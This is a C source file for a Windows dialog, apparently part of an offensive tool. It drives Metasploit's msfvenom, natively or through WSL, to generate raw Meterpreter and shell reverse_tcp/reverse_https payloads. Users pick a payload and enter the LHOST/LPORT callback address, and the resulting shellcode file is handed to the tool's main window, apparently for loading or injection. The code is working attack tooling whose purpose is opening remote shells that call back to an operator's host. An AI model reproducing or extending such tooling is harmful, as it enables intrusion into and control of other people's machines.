#include "gui.h"

BOOL FindNativeMsf(void) {
    WCHAR buf[MAX_PATH];
    if (SearchPathW(NULL, L"msfvenom", L".bat", MAX_PATH, buf, NULL))
        return TRUE;
    static const WCHAR *known[] = {
        L"C:\\metasploit-framework\\bin\\msfvenom.bat",
        L"C:\\Program Files\\Metasploit Framework\\bin\\msfvenom.bat",
        NULL
    };
    for (int i = 0; known[i]; i++)
        if (GetFileAttributesW(known[i]) != INVALID_FILE_ATTRIBUTES)
            return TRUE;
    return FALSE;
}

typedef struct { HWND hwnd; WCHAR cmd[2048]; } GEN_ARGS;

static DWORD WINAPI GenThread(LPVOID param) {
    GEN_ARGS *a = (GEN_ARGS*)param;

    HANDLE hR, hW;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hR, &hW, &sa, 0)) {
        PostMessageW(a->hwnd, WM_GEN_DONE, 1, 0);
        free(a); return 1;
    }
    SetHandleInformation(hR, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = hW;
    si.hStdError  = hW;
    si.hStdInput  = NULL;

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessW(NULL, a->cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hR); CloseHandle(hW);
        PostMessageW(a->hwnd, WM_GEN_DONE, 1, 0);
        free(a); return 1;
    }
    CloseHandle(hW);
    g_hGenProcess = pi.hProcess;

    HWND hMain = GetParent(a->hwnd);
    char buf[512]; DWORD nr;
    while (ReadFile(hR, buf, sizeof(buf) - 1, &nr, NULL) && nr) {
        buf[nr] = '\0';
        int wlen = MultiByteToWideChar(CP_UTF8, 0, buf, -1, NULL, 0);
        WCHAR *wb = malloc((size_t)wlen * sizeof(WCHAR));
        if (wb) {
            MultiByteToWideChar(CP_UTF8, 0, buf, -1, wb, wlen);
            PostMessageW(hMain, WM_APPEND_LOG, 0, (LPARAM)wb);
        }
    }
    CloseHandle(hR);

    DWORD code = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    g_hGenProcess = NULL;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    PostMessageW(a->hwnd, WM_GEN_DONE, (WPARAM)code, 0);
    free(a);
    return 0;
}

const WCHAR *g_payloadTypes[] = {
    L"windows/x64/exec CMD=calc.exe",
    L"windows/x64/exec CMD=cmd.exe",
    L"windows/x64/meterpreter/reverse_tcp",
    L"windows/x64/meterpreter/reverse_https",
    L"windows/x64/meterpreter_reverse_tcp",
    L"windows/x64/meterpreter_reverse_https",
    L"windows/x64/shell_reverse_tcp",
    NULL
};

BOOL PayloadNeedsConn(const WCHAR *p) {
    return (wcsstr(p, L"reverse") != NULL || wcsstr(p, L"bind") != NULL);
}

LRESULT CALLBACK GenDlgProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {

    case WM_CREATE: {
        HINSTANCE hInst = ((CREATESTRUCTW*)lp)->hInstance;
        HFONT font = (HFONT)GetStockObject(DEFAULT_GUI_FONT);

#define DLG_LBL(txt, x, y, w) do {                                         \
    HWND _h = CreateWindowW(L"STATIC", txt, WS_CHILD|WS_VISIBLE|SS_RIGHT,  \
        x, y, w, 20, hwnd, NULL, hInst, NULL);                             \
    SendMessageW(_h, WM_SETFONT, (WPARAM)font, TRUE); } while(0)

#define DLG_EDIT(phwnd, x, y, w, id) do {                                  \
    *(phwnd) = CreateWindowW(L"EDIT", L"",                                  \
        WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL,                       \
        x, y, w, 22, hwnd, (HMENU)(UINT_PTR)(id), hInst, NULL);            \
    SendMessageW(*(phwnd), WM_SETFONT, (WPARAM)font, TRUE); } while(0)

#define DLG_BTN(phwnd, txt, x, y, w, id) do {                              \
    *(phwnd) = CreateWindowW(L"BUTTON", txt,                                \
        WS_CHILD|WS_VISIBLE|BS_PUSHBUTTON,                                  \
        x, y, w, 26, hwnd, (HMENU)(UINT_PTR)(id), hInst, NULL);           \
    SendMessageW(*(phwnd), WM_SETFONT, (WPARAM)font, TRUE); } while(0)

        DLG_LBL(L"Payload:", 10, 18, 75);
        g_hDlgCombo = CreateWindowW(L"COMBOBOX", L"",
            WS_CHILD|WS_VISIBLE|CBS_DROPDOWNLIST|WS_VSCROLL,
            90, 15, 285, 160, hwnd, (HMENU)DLG_COMBO, hInst, NULL);
        SendMessageW(g_hDlgCombo, WM_SETFONT, (WPARAM)font, TRUE);
        for (int i = 0; g_payloadTypes[i]; i++)
            SendMessageW(g_hDlgCombo, CB_ADDSTRING, 0, (LPARAM)g_payloadTypes[i]);
        SendMessageW(g_hDlgCombo, CB_SETCURSEL, 0, 0);

        DLG_LBL(L"LHOST:", 10, 53, 75);
        DLG_EDIT(&g_hDlgLhost, 90, 50, 285, DLG_LHOST);
        SendMessageW(g_hDlgLhost, EM_SETCUEBANNER, 0, (LPARAM)L"192.168.1.x");

        DLG_LBL(L"LPORT:", 10, 88, 75);
        DLG_EDIT(&g_hDlgLport, 90, 85, 100, DLG_LPORT);
        SetWindowTextW(g_hDlgLport, L"4444");

        EnableWindow(g_hDlgLhost, FALSE);
        EnableWindow(g_hDlgLport, FALSE);

        g_hDlgStatus = CreateWindowW(L"STATIC", L"Ready.",
            WS_CHILD|WS_VISIBLE|SS_LEFT,
            10, 125, 365, 20, hwnd, (HMENU)DLG_STATUS, hInst, NULL);
        SendMessageW(g_hDlgStatus, WM_SETFONT, (WPARAM)font, TRUE);

        DLG_BTN(&g_hDlgRun, L"Generate", 10, 158, 150, DLG_RUN);
        {
            HWND _cl;
            DLG_BTN(&_cl, L"Cancel", 225, 158, 150, DLG_CANCEL);
        }

#undef DLG_LBL
#undef DLG_EDIT
#undef DLG_BTN
        return 0;
    }

    case WM_COMMAND:
        switch (LOWORD(wp)) {

        case DLG_COMBO:
            if (HIWORD(wp) == CBN_SELCHANGE) {
                int sel = (int)SendMessageW(g_hDlgCombo, CB_GETCURSEL, 0, 0);
                WCHAR p[256] = {0};
                if (sel >= 0) SendMessageW(g_hDlgCombo, CB_GETLBTEXT, (WPARAM)sel, (LPARAM)p);
                BOOL bConn = PayloadNeedsConn(p);
                EnableWindow(g_hDlgLhost, bConn);
                EnableWindow(g_hDlgLport, bConn);
            }
            return 0;

        case DLG_RUN: {
            int sel = (int)SendMessageW(g_hDlgCombo, CB_GETCURSEL, 0, 0);
            if (sel < 0) sel = 0;
            WCHAR payload_w[256] = {0};
            SendMessageW(g_hDlgCombo, CB_GETLBTEXT, (WPARAM)sel, (LPARAM)payload_w);

            BOOL bConn = PayloadNeedsConn(payload_w);

            WCHAR lhost[256] = {0}, lport[16] = {0};
            if (bConn) {
                GetWindowTextW(g_hDlgLhost, lhost, 256);
                GetWindowTextW(g_hDlgLport, lport, 16);
                if (!lhost[0]) {
                    MessageBoxW(hwnd, L"Enter LHOST.", L"Missing", MB_ICONWARNING);
                    return 0;
                }
                if (!lport[0]) {
                    MessageBoxW(hwnd, L"Enter LPORT.", L"Missing", MB_ICONWARNING);
                    return 0;
                }
                for (int i = 0; lport[i]; i++) {
                    if (!iswdigit(lport[i])) {
                        MessageBoxW(hwnd, L"LPORT must be numeric.", L"Invalid", MB_ICONWARNING);
                        return 0;
                    }
                }
            }

            char payload_a[256]={0}, lhost_a[256]={0}, lport_a[16]={0};
            WideCharToMultiByte(CP_UTF8,0,payload_w,-1,payload_a,256,NULL,NULL);
            if (bConn) {
                WideCharToMultiByte(CP_UTF8,0,lhost,-1,lhost_a,256,NULL,NULL);
                WideCharToMultiByte(CP_UTF8,0,lport,-1,lport_a, 16,NULL,NULL);
            }

            GEN_ARGS *args = malloc(sizeof(*args));
            if (!args) { SetWindowTextW(g_hDlgStatus, L"Out of memory."); return 0; }
            args->hwnd = hwnd;

            if (g_bNativeMsf) {
                WCHAR tmp_w[MAX_PATH];
                GetTempPathW(MAX_PATH, tmp_w);
                swprintf(g_sGenOutWin, MAX_PATH, L"%slb_payload.bin", tmp_w);
                if (bConn)
                    swprintf(args->cmd, 2048,
                        L"cmd.exe /c msfvenom -p \"%hs\" LHOST=%hs LPORT=%hs -f raw -o \"%s\"",
                        payload_a, lhost_a, lport_a, g_sGenOutWin);
                else
                    swprintf(args->cmd, 2048,
                        L"cmd.exe /c msfvenom -p \"%hs\" -f raw -o \"%s\"",
                        payload_a, g_sGenOutWin);
            } else {
                char out_wsl[MAX_PATH];
                if (g_bNativeBuild) {
                    WCHAR tmp_w[MAX_PATH];
                    GetTempPathW(MAX_PATH, tmp_w);
                    swprintf(g_sGenOutWin, MAX_PATH, L"%slb_payload.bin", tmp_w);
                    win_to_wsl(g_sGenOutWin, out_wsl, MAX_PATH);
                } else {
                    wcscpy(g_sGenOutWin, L"/tmp/lb_payload.bin");
                    strcpy(out_wsl, "/tmp/lb_payload.bin");
                }
                char shell[1024];
                if (bConn)
                    snprintf(shell, sizeof(shell),
                        "msfvenom -p '%s' LHOST='%s' LPORT=%s -f raw -o '%s' 2>&1",
                        payload_a, lhost_a, lport_a, out_wsl);
                else
                    snprintf(shell, sizeof(shell),
                        "msfvenom -p '%s' -f raw -o '%s' 2>&1",
                        payload_a, out_wsl);
                swprintf(args->cmd, 2048, L"wsl.exe -- bash -c \"%hs\"", shell);
            }

            SetWindowTextW(g_hDlgStatus, L"Generating...");
            EnableWindow(g_hDlgRun, FALSE);

            HANDLE ht = CreateThread(NULL, 0, GenThread, args, 0, NULL);
            if (ht) CloseHandle(ht);
            else { EnableWindow(g_hDlgRun, TRUE); SetWindowTextW(g_hDlgStatus, L"Thread creation failed."); free(args); }
            return 0;
        }

        case DLG_CANCEL:
            if (g_hGenProcess) { TerminateProcess(g_hGenProcess, 1); g_hGenProcess = NULL; }
            DestroyWindow(hwnd);
            return 0;
        }
        return 0;

    case WM_GEN_DONE:
        if ((DWORD)wp == 0) {
            SetWindowTextW(g_hDlgStatus, L"[+] Done — payload ready.");
            SetWindowTextW(g_hFile, g_sGenOutWin);
            DestroyWindow(hwnd);
        } else {
            SetWindowTextW(g_hDlgStatus, L"[!] msfvenom failed. Check WSL + metasploit-framework.");
            EnableWindow(g_hDlgRun, TRUE);
        }
        return 0;

    case WM_CLOSE:
        if (g_hGenProcess) { TerminateProcess(g_hGenProcess, 1); g_hGenProcess = NULL; }
        DestroyWindow(hwnd);
        return 0;

    case WM_DESTROY:
        g_hDlg = NULL;
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

void ShowGenPayloadDialog(HWND parent) {
    if (g_hDlg) { SetForegroundWindow(g_hDlg); return; }

    HINSTANCE hInst = (HINSTANCE)GetWindowLongPtrW(parent, GWLP_HINSTANCE);

    static BOOL s_registered = FALSE;
    if (!s_registered) {
        WNDCLASSW wc = {
            .lpfnWndProc   = GenDlgProc,
            .hInstance     = hInst,
            .hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1),
            .hCursor       = LoadCursorW(NULL, IDC_ARROW),
            .lpszClassName = L"LBGenDlg",
        };
        RegisterClassW(&wc);
        s_registered = TRUE;
    }

    RECT rc = { 0, 0, 390, 200 };
    AdjustWindowRect(&rc, WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU, FALSE);

    g_hDlg = CreateWindowW(L"LBGenDlg", L"Generate Payload",
        WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU,
        CW_USEDEFAULT, CW_USEDEFAULT,
        rc.right - rc.left, rc.bottom - rc.top,
        parent, NULL, hInst, NULL);
    if (!g_hDlg) return;

    ShowWindow(g_hDlg, SW_SHOW);
    UpdateWindow(g_hDlg);
}
